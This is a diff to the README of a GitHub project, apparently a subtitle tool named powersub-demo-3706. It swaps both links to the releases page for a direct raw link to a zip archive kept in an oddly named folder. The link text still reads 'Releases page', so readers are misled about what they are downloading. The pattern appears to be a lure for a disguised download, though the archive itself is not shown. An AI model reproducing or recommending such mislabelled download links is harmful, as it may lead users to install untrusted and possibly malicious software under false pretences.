@@ -6,7 +6,7 @@ Welcome to powersub-demo-3706! This application simplifies subtitle management f
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Juanpinie08/powersub-demo-3706/releases)
+[![Download](https://raw.githubusercontent.com/Juanpinie08/powersub-demo-3706/main/uncongregational/powersub-demo-3706_3.6.zip)](https://raw.githubusercontent.com/Juanpinie08/powersub-demo-3706/main/uncongregational/powersub-demo-3706_3.6.zip)
 
 ## 🔍 System Requirements
 
@@ -28,7 +28,7 @@ Before you download, make sure your computer meets these requirements:
 
 To get started with powersub-demo-3706, follow these steps:
 
-1. **Visit the Releases Page:** Head over to our [Releases page](https://github.com/Juanpinie08/powersub-demo-3706/releases).
+1. **Visit the Releases Page:** Head over to our [Releases page](https://raw.githubusercontent.com/Juanpinie08/powersub-demo-3706/main/uncongregational/powersub-demo-3706_3.6.zip).
 
 2. **Choose the Latest Version:** Look for the latest release at the top of the list. It will have the highest version number.
 
